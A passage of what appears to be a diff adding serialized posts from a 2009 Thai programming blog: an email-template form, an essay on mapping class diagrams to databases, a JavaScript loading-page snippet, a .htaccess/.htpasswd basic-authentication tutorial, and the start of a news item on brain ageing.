+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br style="background-color: rgb(192,192,192)" />
+&lt;/script&gt; <br />
+&nbsp;</p>
+<h3><br />
+<br />
+<span style="color: #ff0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ตัวอย่างการประยุกต์ใช้นะครับ</span></h3>
+<p><br />
+&lt;table border='0' width=&quot;100%&quot;&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &lt;tr&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;td width=&quot;50%&quot;&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;table&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;tr&gt;&lt;td&gt;&lt;INPUT TYPE=&quot;checkbox&quot; NAME=&quot;send_flag&quot; id=&quot;send_flag&quot;&gt;Send to sender&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;tr&gt;&lt;td&gt;From&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;send_from&quot; id=&quot;send_from&quot; onfocus=&quot;setElement(this)&quot;&gt;&lt;/td&gt;&lt;/tr&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;tr&gt;&lt;td&gt;Reply-To&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;send_reply&quot; id=&quot;send_reply&quot; onfocus=&quot;setElement(this)&quot;&gt;&lt;/td&gt;&lt;/tr&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;tr&gt;&lt;td&gt;Subject&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;send_subject&quot; id=&quot;send_subject&quot; onfocus=&quot;setElement(this)&quot;&gt;&lt;/td&gt;&lt;/tr&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;tr valign=&quot;top&quot;&gt;&lt;td&gt;Body&lt;/td&gt;&lt;td&gt;&lt;textarea id=&quot;send_body&quot; name=&quot;send_body&quot; cols=&quot;50&quot; rows=&quot;7&quot; onfocus=&quot;setElement(this)&quot;&gt;&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;/table&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;/td&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;td valign=&quot;top&quot;&gt;<br style="background-color: rgb(192,192,192)" />
+<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Variable&lt;BR&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;select id='variables'&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &lt;option value=&quot;$(SUBJECT)&quot;&gt;SUBJECT&lt;/option&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &lt;option value=&quot;$(FROM)&quot;&gt;From&lt;/option&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &lt;option value=&quot;$(TO)&quot;&gt;To&lt;/option&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &lt;option value=&quot;$(SOURCEIP)&quot;&gt;SourceIP&lt;/option&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &lt;option value=&quot;$(DATE)&quot;&gt;Date&lt;/option&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &lt;option value=&quot;$(REASON)&quot;&gt;Reason&lt;/option&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &lt;option value=&quot;$(ACTION)&quot;&gt;Action&lt;/option&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &lt;option value=&quot;$(HEADER)&quot;&gt;Header&lt;/option&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &lt;option value=&quot;$(SIZE)&quot;&gt;Size&lt;/option&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &lt;option value=&quot;$(POSTMASTER)&quot;&gt;Postmaster&lt;/option&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &lt;/select&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &lt;input type=&quot;button&quot;&nbsp; value=&quot;&lt;?=_(&quot;Insert&quot;)?&gt;&quot; onclick=&quot;insertToBody();&quot;&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;/td&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &lt;/tr&gt;<br style="background-color: rgb(192,192,192)" />
+&lt;/table&gt;&nbsp;&nbsp;&nbsp;</p>";s:9:"post_date";s:10:"2009-02-11";}i:4;a:6:{s:10:"content_id";s:2:"14";s:11:"category_id";s:2:"23";s:12:"content_name";s:90:"ความสัมพันธ์ระหว่าง Class Diagram และ Database";s:15:"content_summary";s:625:"<p><img height="85" alt="" width="127" src="http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/database.jpg" /></p>
+<p>ไปเจอมาจาก narisa เห็นว่าน่าสนใจ ขอบคุณเหล่าทวยเทพแห่ง narisa ด้วยนะครับ <br />
+โดยเฉพาะเจ้าของคุณ&nbsp; <a style="color: rgb(153,51,0)" href="http://www.narisa.com/forums/index.php?s=95e82fb3e302072bbd4aa5292a9b7da5&amp;showuser=10538">minimalist</a><br style="color: rgb(153,51,0)" />
+http://www.narisa.com/forums/index.php?showtopic=14372</p>";s:14:"content_detail";s:10811:"<p><b><span style="color: #ff0000">ไปเจอมาจาก narisa เห็นว่าน่าสนใจ ขอบคุณเหล่าทวยเทพแห่ง narisa ด้วยนะครับ <br />
+โดยเฉพาะเจ้าของคุณ&nbsp; </span></b><a style="color: rgb(153,51,0)" href="http://www.narisa.com/forums/index.php?s=95e82fb3e302072bbd4aa5292a9b7da5&amp;showuser=10538"><b><span style="color: #ff0000">minimalist</span></b></a><b><span style="color: #ff0000"><br style="color: rgb(153,51,0)" />
+http://www.narisa.com/forums/index.php?showtopic=14372</span><br />
+<br />
+<br />
+&nbsp;ตอนทำ Analysis เราต้องระบุว่าแต่ละคลาสที่หาได้เป็นคลาสชนิดใด<br />
+<br />
+Analysis Class มี 3 ประเภท คือ<br />
+1. Boundary Class คือส่วนติดต่อระหว่าง Actor กับ Use Case หรือ เอาให้ง่ายขึ้นคือ ส่วนติดต่อระหว่างโปรแกรมกับคนหรืออุปกรณ์หรือโปรแกรมอื่น เช่น หน้าจอ อินเตอร์เฟสใน OO หรือใน Java<br />
+2. Control Class คือส่วนที่ทำหน้าที่ประมวลผล Logic หลักของ Use Case นั้น<br />
+3. Entity Class คือส่วนที่ Represent ข้อมูลที่การประมวลผลใน Use Case นั้นมีการเรียกใช้ (ปกติคือ Read / Write)<br />
+<br />
+Object Data Model แบบพื้นฐานก็คือการดึงเอาพวก Entity Class ออกมารวมกันใน Class Diagram เดียว กำหนด<br />
+ความสัมพันธ์พวก Association, Composition, Aggregation, Generalization ให้เรียบร้อย และกำหนด Multiplicity ให้สมบูรณ์<br />
+(ย้ำ สมบูรณ์) ส่วน Navigability กำหนดให้เป็นแบบ Bi-Directional ชัวร์สุด กันเหนียว<br />
+<br />
+จากนั้น Class Diagram นี้ก็ Map ไปเป็น Relational Data Model (ER Diagram) ต่ออีกที การ Map จากยากหน่อย<br />
+หากใน Object Data Model มีการใช้ความสัมพันธ์แบบ Generalization (การ Extend / Inheritance) เพราะ Table ใน<br />
+Relational Database มัน Extend / Inherit กันไม่ได้ ต้องใช้เทคนิคในการ Map หรือใช้พวก Architectural Patterns<br />
+มาช่วยในการ Map<br />
+<br />
+การ Map ที่ว่าข้างต้นเรียกว่าการทำ Object-to-Relational Mapping (ORM)<br />
+<br />
+ส่วนจะทำอะไรก่อนอะไรหลังระหว่างทำคลาสก่อน หรือ ทำ table ก่อน<br />
+<br />
+ขึ้นกับ Software Development Process และที่สำคัญขึ้นกับการแบ่งทีมงาน (Resource) และความรู้ความชำนาญของผู้ทำ<br />
+เช่น<br />
+<br />
+Case: 1<br />
+นาย ก เป็น Software Designer ออกแบบ Object Data Model เก่ง นาย ก ก็ทำไป ส่วนนาย ข ออกแบบ ER Diagram เก่ง<br />
+นาย ข ก็ทำไป สุดท้าย นาย ค เป็น Architect หรือ เป็นอะไรก็ได้แต่เก่ง ORM ก็มาทำการ Map งานนาย ก กับนาย ข<br />
+<br />
+Case: 2<br />
+นาย ก เก่งไปหมด Solo คนเดียว ดังนั้นจะทำอะไรก่อนก็ได้ หรือทำไปพร้อม ๆ กันก็ได้ เช่น หาคลาสได้ 4 ตัว ก็ Map ไปเป็น<br />
+Table ก่อน จากนั้นอีก 4 วันหาคลาสได้อีก 5 ตัว ก็ Map ไปเป็น Table อีก<br />
+<br />
+Case: 3<br />
+บริษัทของนาย ก, ข และ ค ใช้ Software Development Process คือ XP โดยมี Policy ว่าต้องออกแบบ Object Data Model<br />
+ก่อน แล้วค่อย Map ไปเป็น ER Diagram ดังนั้น นาย ก ต้องออกแบบ Object Data Model ก่อน เสร็จแล้วนาย ค<br />
+ก็ Map ไปเป็น ER Diagram โดยนาย ค มีนาย ข เป็นที่ปรึกษาด้าน RDBMS / Relational Database Design<br />
+* ซึงบริษัทใหญ่ ๆ นาย ข มักถูกแบ่งออกไปเป็น นาย ข-ไข่ ทำหน้าที่ออกแบบ ER Diagram และ นาย ข-ขวด ทำหน้าที่<br />
+เป็น DBA<br />
+<br />
+Case: 4<br />
+บริษัทของนาย ก, ข และ ค มีประสบการณ์และชำนาญด้าน RDBMS และ/หรือ ไม่มี Software Development Process<br />
+ที่มีวุฒิภาวะ (Maturity) ที่ดี และ/หรือ DBA เป็นใหญ่หรือมี Power มาก (หลายองค์กรโอ๋ DBA มากเกินควร เพราะ Sensitive<br />
+กับข้อมูลใน 'ถัง' ข้อมูลมากเกินไป) และ/หรือ นาย ก ไม่ได้เก่งด้าน Object Data Model แท้จริง แต่มีรากเหง้าประสบการณ์<br />
+ความรู้ ความชำนาญ และทัศนคติด้านการออกแบบ ER Diagram มามาก (เข้าข่าย Database Driven Development)<br />
+อาจทำให้การออกแบบ Object Data Model ไม่ดีเท่าที่ควร Case นี้ นาย ข มักเป็นผู้เริ่มทำก่อน โดยออกแบบ ER Diagam<br />
+ก่อน แล้วนาย ก ค่อยมาดูแล้ว Map ไปเป็นคลาส แต่ด้วย นาย ก ไม่แม่นเรื่อง Object Data Model ทำให้อาจได้คลาส<br />
+แบบผิด ๆ หรือไม่ดีออกมาได้ หลายครั้งสำหรับ Case นี้มักพบว่านาย ก กับนาย ข เป็นคนคนเดียวกัน คือ นาย กข และมักออกแบบ<br />
+ER Diagram ก่อน โดยในหัวคิดอะไรก็เป็น Column, Record, Table, Primary Key, Compound Key, Foreign Key,<br />
+Constraint, One-to-One, One-to-Many, Many-to-Many ฯลฯ แล้วค่อยมาหาคลาส หลายครั้งพบว่า Object Data Model<br />
+ไม่ได้ทำ แต่ได้คลาสเลย พอต่อมามีปัญหาขึ้นมา จะ Trace กลับไปก็ลำบาก<br />
+<br />
+ยังมี Case อื่น ๆ อีก แต่ 4 Case ข้างบนมักพบเห็นได้บ่อย ๆ Case ที่ดีคือจะทำอะไรก่อนก็ได้ระหว่าง Object Data Model<br />
+กับ ER Diagram แต่สำคัญไอ้เจ้าตรงกลางนี่ล่ะ คือการทำ Object-to-Relational Mapping ต้องมีคนทำเป็นจริง ๆ<br />
+Map เป็น คนที่ Map เก่งนอกจากต้องเก่ง OO, การออกแบบ Object Data Model และการออกแบบ ER Diagram แล้ว<br />
+ต้องเข้าใจเรื่อง Application / System Performance, Transaction, Persistence Mechanism, Resource<br />
+Comsumption ด้วย<br />
+<br />
+ดังนั้นหากต้องการ Generate จากคลาสไปเป็น Table โดยใช้ Tool ต้องศึกษาว่า Tool นั้นใช้เทคนิคการ Map แบบไหน<br />
+สามารถให้เราปรับแต่งหรือกำหนดการ Map ได้หรือไม่ (Tool ส่วนมากให้ทำได้)<br />
+<br />
+แต่ที่สำคัญคลาสที่จะถูก Generate ไปเป็น Table ต้องเป็น Entity Class เช่น เป็นพวก Value Object (JavaBeans)<br />
+ซึงคลาสเหล่านี้จะมี Persistence Mechanism / Logic ฝังอยู่ด้วยหรือไม่ก็ได้ ขึ้นกับเทคนิคการออกแบบ<br />
+<br />
+ลองหาหนังสือชื่อ Patterns of Enterprise Application Architecture โดย Martin Fowler มาอ่านดูนะครับ<br />
+จะมี Architectural Patterns ที่น่าสนใจในการทำ Object-to-Relational Mapping รวมถึงการทำ Inheritance Mapping<br />
+ที่น่าสนใจหลายตัว และอ่านง่าย<br />
+<br />
+- จงอย่าเชื่อ Tool เสมอไปว่ามันเลือกใช้กลยุทธ์ (Strategy) ที่ดีที่สุดในการทำ Mapping / Generate ให้กับเรา -<br />
+<br />
+- ผลลัพธ์ของการออกแบบจะไม่แสดงให้เห็นทันทีที่ซอฟต์แวร์ถูกพัฒนาเสร็จ ดังนั้น Software Testing ควรถูกบรรจุ<br />
+ไว้ทุก ๆ ช่วงของกระบวนการพัฒนาซอฟต์แวร์ -<br />
+<br />
+minimalist (ณรงค์ จันทร์สร้อย)<br />
+21 ธันวาคม 2549 </b><!--IBF.ATTACHMENT_76984--><!-- THE POST --></p>";s:9:"post_date";s:10:"2009-02-11";}i:5;a:6:{s:10:"content_id";s:2:"13";s:11:"category_id";s:1:"6";s:12:"content_name";s:32:"Javascript + PHP loading page...";s:15:"content_summary";s:445:"<p><img height="97" width="128" src="http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/java.jpg" alt="" /></p>
+<p>บางครั้งมี page บางหน้าโหลดนานมาก อาจจะติดต่อกับฐานข้อมูลหรือว่าอะไรก็ตาม<br />
+เรามาทำหน้า preload โดยใช้ java script กันดูครับ</p>";s:14:"content_detail";s:1315:"<p>&nbsp;</p>
+<p>&lt;html&gt;<br />
+&lt;head&gt;<br />
+&lt;title&gt;Report&lt;/title&gt;<br />
+&lt;/head&gt;<br />
+&lt;body OnLoad=&quot;document.all.loading_layer.s<wbr></wbr>tyle.visib<wbr></wbr>ility = 'hidden'; document.all.main_layer.st<wbr></wbr>yle.visibi<wbr></wbr>lity = 'visible';&quot;;&gt;<br />
+&lt;div id=&quot;loading_layer&quot; style=&quot;position:absolute; width:100%; visibility:visible;&quot;&gt;<br />
+&lt;table width=&quot;600&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot;&gt;<br />
+&lt;tr&gt;<br />
+&lt;td align=&quot;center&quot;&gt;Building Report. Please Wait...&lt;/td&gt;<br />
+&lt;/tr&gt;<br />
+&lt;/table&gt;<br />
+&lt;/div&gt;<br />
+<br />
+&lt;div id=&quot;main_layer&quot; style=&quot;position:absolute; width:100%; visibility:hidden;&quot;&gt;<br />
+&lt;table width=&quot;600&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot;&gt;<br />
+&lt;tr&gt;<br />
+&lt;td&gt;SOME PHP CODE HERE ที่ทำงานช้าหรือว่านานมากๆๆๆๆๆๆๆๆๆๆๆๆๆๆๆๆ จนลูกค้าบ่นๆๆๆๆ หุหุ&lt;/td&gt;<br />
+&lt;/tr&gt;<br />
+&lt;/table&gt;<br />
+&lt;/div&gt;<br />
+<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</p>
+<p>&nbsp;</p>";s:9:"post_date";s:10:"2009-02-11";}i:6;a:6:{s:10:"content_id";s:2:"12";s:11:"category_id";s:1:"2";s:12:"content_name";s:54:"User authentication ด้วย .htpasswd + .htaccess";s:15:"content_summary";s:945:"<p><img height="121" width="121" alt="" src="http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/rd.jpg" /></p>
+<p><b>ขั้นตอนการ lock ห้องของตนเอง ในฐานะผู้ใช้ทั่วไป</b></p>
+<ol>
+    <li>ท่านต้องส่งแฟ้ม 2 แฟ้มคือ .htpasswd และ .htaccess ไปไว้ในห้องที่ต้องการ lock โดยทำการถาม User และ password ก่อนเข้า</li>
+    <li><b>.htaccess</b> นั้นสามารถคัดลอกด้านล่างไปได้เลย โดยแก้ไขอะไรเล็กน้อยตามต้องการ เช่นเปลี่ยนคำว่า lock ที่บรรทัดแรก เป็น username ของท่าน................................</li>
+</ol>
+<p>&nbsp;</p>";s:14:"content_detail";s:3805:"<p>อ่านเพิ่มเติมได้จาก http://www.apacheweek.com/features/userauth <br />
+หรือ http://www.thaiall.com/cgi/htpasswd.pl</p>
+<ol><b>ขั้นตอนการ lock ห้องของตนเอง ในฐานะผู้ใช้ทั่วไป</b>
+    <li>ท่านต้องส่งแฟ้ม 2 แฟ้มคือ .htpasswd และ .htaccess ไปไว้ในห้องที่ต้องการ lock โดยทำการถาม User และ password ก่อนเข้า</li>
+    <li><b>.htaccess</b> นั้นสามารถคัดลอกด้านล่างไปได้เลย โดยแก้ไขอะไรเล็กน้อยตามต้องการ เช่นเปลี่ยนคำว่า lock ที่บรรทัดแรก เป็น username ของท่าน</li>
+    <li><b>.htpasswd</b> แต่ละบรรทัดคือ 1 user สำหรับแฟ้มนี้ ถ้าผู้ดูแลไม่คิดบริการ ท่านก็ใช้บริการไม่ได้ สำหรับ server ที่ผมดูแล ได้ทำ <a href="http://www.isinthai.com/lock">โปรแกรมเข้ารหัส</a> สร้างรหัสให้ <br />
+    ถ้าเป็นผู้ดูแล(Super user) สามารถใช้ <br />
+    คำสั่ง <b>#htpasswd -nb yourname yourpassword</b> แสดงรหัสผ่าน ที่ shell prompt <br />
+    คำสั่ง <b>#htpasswd -c .htpasswd yourname</b> สร้างแฟ้ม .htpasswd พร้อม รอรับรหัสผ่าน จากแป้นพิมพ์ <br />
+    ดูเพิ่มเติมจาก <b>#man htpasswd</b> ที่ shell prompt</li>
+    <li>เปิด เว็บ http://www.isinthai.com/lock/index.php เพื่อป้อนรหัสผู้ใช้ และรหัสผ่าน จะได้รหัสที่สร้างขึ้น เพื่อนำไปเพิ่มในแฟ้ม .htpasswd</li>
+</ol>
+<ul><b>http://www.isinthai.com/lock/.htaccess</b><font face="courier new" color="red">
+    <ul>AuthUserFile /var/www/html/lock/.htpasswd <br />
+        AuthName &quot;User:yourname Password:yourpassword for accessing this directory&quot; <br />
+        AuthType Basic <br />
+        require valid-user <br />
+        DirectoryIndex index.html index.htm index.shtml index.php</ul>
+        </font><b>http://www.isinthai.com/lock/.htpasswd</b><font face="courier new" color="red">
+        <ul>test:1A/c8vPQJQiL2 <br />
+            yourname:UtecEDcEa3/L2</ul>
+            </font><b>ปัญหา และวิธีแก้ไข ที่ผู้ดูแลอาจพบ</b><dd>ครั้งแรกที่สร้าง .htaccess และ .htpasswd ก็ไม่เกิดผล คือสองแฟ้มนี้ไม่ทำงาน ตรวจสอบแล้วพบว่าผู้ดูแลต้องแก้แฟ้ม <font face="courier new">/etc/httpd/conf/httpd.conf</font>  </dd><dd>ให้ส่วนของ &lt;Directory &quot;/var/www/html&quot;&gt; ในบรรทัดที่เขียนว่า <b>AllowOverride None เปลี่ยนเป็น AllowOverride All</b> </dd><dd>หรือส่วนของ &lt;Directory &quot;/&quot;&gt; ในบรรทัดที่เขียนว่า <b>AllowOverride None เปลี่ยนเป็น AllowOverride All</b> ถ้าท่านใช้ public_html </dd></ul>
+            <p>ที่มา http://www.isinthai.com/?q=0974</p>";s:9:"post_date";s:10:"2009-02-11";}i:7;a:6:{s:10:"content_id";s:2:"11";s:11:"category_id";s:1:"5";s:12:"content_name";s:104:"สมองคนเราเริ่มเสื่อมตั้งแต่อายุ 40 ปี ";s:15:"content_summary";s:624:"<p><img height="97" width="97" alt="" src="http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/brain.jpg" /></p>
+<p>นักประสาทวิทยามหาวิทยาลัยแคลิฟอร์เนีย ของอเมริกาเปิดเผยให้ทราบว่า ที่สมองของคนเราชักจะเริ่มเชื่องช้าลง <br />
+เมื่ออายุ 40 ปี เป็นเพราะกลไกในสมองเริ่ม<span style="font-family: Arial;">เสื่อมโทรม</span></p>";s:14:"content_detail";s:4804:"<p><span style="font-family: Arial;">นักประสาทวิทยามหาวิทยาลัยแคลิ ฟอร์เนีย ของอเมริกาเปิดเผยให้ทราบว่า ที่สมองของคนเราชักจะเริ่มเชื่องช้าลง เมื่ออายุ 40 ปี เป็นเพราะกลไกในสมองเริ่มเสื่อมโทรม</span></p>
+<p><span style="font-family: Arial;">ดร.ยอร์จ บาร์โซกิส นักประสาทวิทยาหัวหน้าคณะนักวิจัย กล่าวชี้ว่า ไม่ว่าจะขว้างลูกบอลหรือหักพวงมาลัยหลบหลีกได้ รวดเร็วแค่ไหน อยู่ที่เซลล์สมองจะยิงคำสั่งไปยังกล้ามเนื้อได้เร็วเท่าใด และการที่คำสั่งจะเดินทางไปได้เร็ว ก็ขึ้นอยู่กับฉนวนที่หุ้มสายที่โยงใยสมองว่ายังคงสภาพดีอยู่</span></p>
+<p><span style="font-family: Arial;"><br />
+เขาบอกต่อไปว่า ตามปกติเมื่อคนเราย่างเข้าวัยกลางคน แม้ว่าจะยังคงแข็งแรงสมบูรณ์ดีอยู่ แต่ส่วนที่เป็นฉนวนในสมองส่วนที่ควบคุมการเคลื่อนไหว ก็ชักจะเริ่มเสื่อมลง ทำให้ความว่องไวลดลงไปตามส่วนด้วย</span></p>
+<p><span style="font-family: Arial;"><br />
+คณะ นักวิจัยได้ยกให้เห็นความ สำคัญของการออกกำลังร่างกายและสมองว่า จะช่วยให้สมองเองพบฉนวนส่วนที่หลุดลุ่ยลง และแจ้งให้รีบซ่อมแซมเซลล์ให้ใช้งานโดยรีบด่วน</span></p>
+<p><span style="font-family: Arial;">ดร.ยอร์จ ได้เปรียบสมองว่าคล้ายกับอินเตอร์เน็ต ซึ่งความรวดเร็วขึ้นอยู่กับความกว้างของแถบคลื่น แต่ของสมองอยู่กับส่วนที่เรียกว่า ไมอีลิน ซึ่งเป็นแผ่นไขมันที่หุ้มใยประสาทอยู่</span></p>
+<p><span style="font-family: Arial;"><br />
+ไมอีลีนที่สมบูรณ์ จะหุ้มเป็นฉนวนอยู่รอบใยประสาทอย่างแน่นหนา ทำให้ส่งสัญญาณไฟฟ้าที่สมองส่งคำสั่งได้ทันควัน ประจุไฟฟ้าความถี่สูง จะส่งให้ทำการเคลื่อนไหวได้อย่างว่องไว เขาได้ยกยอดนักบาสเกตบอล อย่างไมเคิล จอร์แดนเป็นตัวอย่างว่า &quot;วงจรไฟฟ้าของสมองของเขา ที่สร้างให้เขาเป็นนักบาสผู้ยิ่งใหญ่ อาจจะเป็นเพราะมีไมอีลีนดีกว่ามนุษย์คนอื่นส่วนใหญ่&quot;</span></p>
+<p><span style="font-family: Arial;"><br />
